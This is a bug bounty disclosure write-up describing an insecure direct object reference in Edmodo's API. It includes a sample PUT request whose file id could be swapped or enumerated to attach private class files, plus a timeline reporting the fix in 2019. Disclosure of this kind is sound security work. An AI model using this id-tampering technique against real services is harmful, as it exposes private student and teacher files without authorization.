---
tags: bugbounty
category: BugBounty
---

# What is Edmodo ?

It's a platform to connect teachers-students-parents. Kind of social networking for learning.

# Functionality

* Edmodo is having a functionality called classes.
* A teacher can create a class and invite students to join the class.
* Teachers generally upload their notes/assignments/files etc inside a class.
* Classes are private & only those students who are having an invitation can access the content posted inside that class.
* With this bug, I was able to access the private attachments of any class without being a member of it.

# Proof Of Concept

1. From a teacher’s edmodo account, go to your class and capture the request for editing a post (the post should have an attachment).
2. Request looks like:

    ```
    PUT /messages/693960217?access_token=xyz&request_origin=react-web-app HTTP/1.1
    Host: api.edmodo.com
    Connection: close
    Content-Length: 180
    Accept: application/json
    Origin: https://new.edmodo.com
    User-Agent: Mozilla/5.0
    Content-Type: application/json
    Referer: https://new.edmodo.com/groups/my-class-1234
    Accept-Language: en-US,en;q=0.9
    {“content”:{“id”:693960217,”text”:”Final notes”,”attachments”:{“files”:[{“id”:910143311}],”links”:[],”embeds”:[]}},”id”:693960217,”url”:”https://api.edmodo.com/messages/693960217"}

    ```
3. It is taking **“files”:[{“id”:910143311}]** parameter and attaching the file with the given id in your post. An attacker can change that id to any number and that file will be linked to his post (file ids can be enumerated by incrementing/decrementing the captured value). 

## Video POC

[![Edmodo IDOR POC](https://img.youtube.com/vi/h55s-_ZBADE/0.jpg)](https://youtu.be/h55s-_ZBADE)


## Timeline

* Mar. 17, 2019 — Initial Report
* Mar. 18, 2019 — Report Triaged
* Mar. 25, 2019 — Bug Fixed and Swag Awarded